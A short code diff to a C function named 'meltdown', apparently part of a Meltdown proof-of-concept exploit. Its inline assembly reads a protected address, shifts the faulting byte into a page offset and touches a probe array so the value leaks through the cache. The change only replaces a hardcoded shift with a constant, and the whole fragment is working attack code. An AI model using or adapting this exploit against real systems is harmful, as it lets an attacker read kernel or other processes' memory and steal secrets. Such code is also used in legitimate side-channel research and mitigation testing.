@@ -66,11 +66,11 @@ int meltdown(uintptr_t addr, uint8_t *val)
         "xorq %%rax, %%rax      \n\t" // clear RAX
         "retry:                 \n\t" // retry (?)
         "movb (%0), %%al        \n\t" // read addr, this will raise SIGSEGV
-        "shlq $0x0c,%%rax       \n\t" // shift left
+        "shlq %2,   %%rax       \n\t" // shift left
         "jz retry               \n\t" // jz retry (?)
         "movb (%1, %%rax), %%al \n\t" // read from tube
         :
-        : "r"(addr), "r"(tube)
+        : "r"(addr), "r"(tube), "J"(CHUNK_OFFSET)
         : "rax"); // RAX is used internally
 
 cont:
